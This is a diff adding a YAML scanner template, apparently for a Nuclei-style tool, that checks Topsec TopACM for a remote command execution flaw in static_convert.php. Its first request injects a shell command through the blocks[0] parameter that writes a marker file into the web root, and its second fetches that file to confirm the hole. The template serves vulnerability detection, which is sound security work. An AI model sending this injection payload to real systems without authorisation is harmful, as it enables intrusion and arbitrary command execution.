@@ -1,0 +1,47 @@
+id: topsec-topacm-rce
+brief:
+    title: Topsec Topacm - Remote Code Execution
+    by: SleepingBag945
+    level: critical
+    about: Tianrongxin Internet Behavior Management System static_convert.php remote command execution vulnerability
+    label:
+        - rce
+        - topsec
+        - topacm
+        - intrusive
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20%27{{randstr}}%27%20%3E%20/var/www/html/config_application.txt%0a'
+      signs:
+        - "on": word
+          has:
+            - '{{randstr}}'
+          in: body_2
+          need: all
+        - "on": word
+          has:
+            - text/plain
+          in: header_2
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/config_application.txt'
+      signs:
+        - "on": word
+          has:
+            - '{{randstr}}'
+          in: body_2
+          need: all
+        - "on": word
+          has:
+            - text/plain
+          in: header_2
+          need: all
+        - "on": status
+          status:
+            - 200
